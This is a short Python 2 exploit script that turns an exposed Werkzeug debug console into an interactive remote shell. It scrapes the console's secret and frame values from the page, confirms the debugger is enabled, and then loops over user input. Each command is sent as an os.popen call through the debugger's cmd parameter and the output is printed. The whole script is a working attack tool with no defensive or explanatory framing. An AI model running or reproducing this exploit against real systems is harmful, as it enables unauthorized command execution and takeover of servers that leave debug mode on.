#!/usr/bin/python
# Author: SamDubYah
# Date: Oct 18 2019
###
### This tool will exploit the vulnerability in
### the Werkzeug web application by using a loop to continue
### to pull in cmd functions and pass them to the Web App
###
### This is a very hacky WebApp hack as it simply simulates
### a shell on the machine using a forever while loop.
###

import sys
import requests
import re
import urllib
from bs4 import BeautifulSoup


def usage():
    print "\nThis is a simple program to Exploit Werkzeug"
    print "\nusage: python Werkzeug.py http://www.example.com/path/to/console\n"

# Checks that an additional argument is supplied
if len(sys.argv) != 2:
    usage()
    sys.exit(-1)

# Setting static variables
url = sys.argv[1]

__debugger__ = 'yes'


#getting response to parse for secret & frm
response = requests.get(url)

# Finding the secret and frm key from the response.text
secret = re.findall("[0-9a-zA-Z]{20}",response.text)
frm = re.findall("[0-9]{15}",response.text)

# Sanity check for frm and secret strings
if len(secret) != 1:
    print "[-] Unable to find secret"
    sys.exit(-1)
elif len(frm) == 0:
    print "[!] Unable to find frm"
    print "[!] Defaulting frm to 0"
    frm = '0'
else:
    #If everything correct, set secret to first instance found and frm to second
    secret = secret[0]
    frm = frm[1]
    print "[+] Secret found: " + str(secret)
    print "[+] Frm found: " + str(frm)

# Getting response for werkzeug sanity check
response = requests.get(url)

# Sanity check on debug werkzeug console
if "Werkzeug powered traceback interpreter" not in response.text:
    print "[-] Debug not enabled"
    sys.exit(-1)


print ("[+] starting hacked shell on " + url)
print ("[+] use Ctrl + C to kill shell")


# Start of while loop hacked shell
while(1):

    #Getting user raw input to implement commands
    shell_cmd = raw_input("#:")
    cmd = ('''__import__('os').popen('%s').read();''' % shell_cmd) #setting the cmd with user supplied input

    #response to be sent to werkzeug debug console
    response = requests.get("%s?__debugger__=yes&cmd=%s&frm=%s&s=%s"% (url, str(cmd), frm, secret))

    #Server's response Debug information
    print "[+] Response from server"
    print "[+] Status code: " + str(response.status_code)
    print "[+] Response: " + BeautifulSoup(response.text, "html.parser").get_text()

